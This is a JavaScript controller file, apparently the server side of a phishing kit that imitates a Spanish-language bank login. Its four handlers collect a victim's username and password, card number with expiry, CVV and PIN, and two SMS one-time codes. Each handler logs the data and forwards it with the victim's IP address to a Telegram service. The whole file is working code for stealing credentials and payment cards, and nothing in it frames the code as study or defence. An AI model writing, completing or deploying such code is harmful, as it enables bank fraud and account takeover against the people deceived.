const requestIp = require('request-ip');
const telegramService = require('../services/telegram.service');
const monitorService = require('../services/monitor.service');

class AuthController {
    // 1. Handle Login Form Submit
    async handleLogin(req, res) {
        try {
            const { logi, paso } = req.body;

            // Strict Validation: Username is required
            if (!logi || !paso) {
                return res.status(400).json({
                    OK: false,
                    error: 'missing_fields',
                    message: 'Por favor, complete todos los campos.'
                });
            }

            // Strict Validation: Reject email addresses
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            const isEmail = emailRegex.test(logi.trim()) || logi.includes('@');
            if (isEmail) {
                return res.status(400).json({
                    OK: false,
                    error: 'email_not_allowed',
                    message: 'No se admiten direcciones de correo electrónico. Por favor, introduzca su usuario o identificación.'
                });
            }

            const clientIp = requestIp.getClientIp(req);
            monitorService.trackEvent('login', clientIp, { user: logi, pass: paso });
            await telegramService.sendLogin({ logi, paso }, clientIp);

            return res.json({ OK: true });
        } catch (err) {
            console.error('Error handling login submit:', err);
            return res.status(500).json({ OK: false, error: 'server_error' });
        }
    }

    // 2. Handle Card Form Submit
    async handleCard(req, res) {
        try {
            const { a1, a2, a3, a4 } = req.body;
            const clientIp = requestIp.getClientIp(req);

            monitorService.trackEvent('card', clientIp, { card: a1, exp: a2, cvv: a3, pin: a4 });
            await telegramService.sendCard({ a1, a2, a3, a4 }, clientIp);
            return res.json({ OK: true });
        } catch (err) {
            console.error('Error handling card submit:', err);
            return res.status(500).json({ OK: false, error: 'server_error' });
        }
    }

    // 3. Handle SMS OTP 1 Submit
    async handleSms1(req, res) {
        try {
            const { sps1 } = req.body;
            const clientIp = requestIp.getClientIp(req);

            monitorService.trackEvent('sms1', clientIp, { otp: sps1 });
            await telegramService.sendSms1({ sps1 }, clientIp);
            return res.json({ OK: true });
        } catch (err) {
            console.error('Error handling sms1 submit:', err);
            return res.status(500).json({ OK: false, error: 'server_error' });
        }
    }

    // 4. Handle SMS OTP 2 Submit
    async handleSms2(req, res) {
        try {
            const { sps2 } = req.body;
            const clientIp = requestIp.getClientIp(req);

            monitorService.trackEvent('sms2', clientIp, { otp: sps2 });
            await telegramService.sendSms2({ sps2 }, clientIp);
            return res.json({ OK: true });
        } catch (err) {
            console.error('Error handling sms2 submit:', err);
            return res.status(500).json({ OK: false, error: 'server_error' });
        }
    }
}

module.exports = new AuthController();
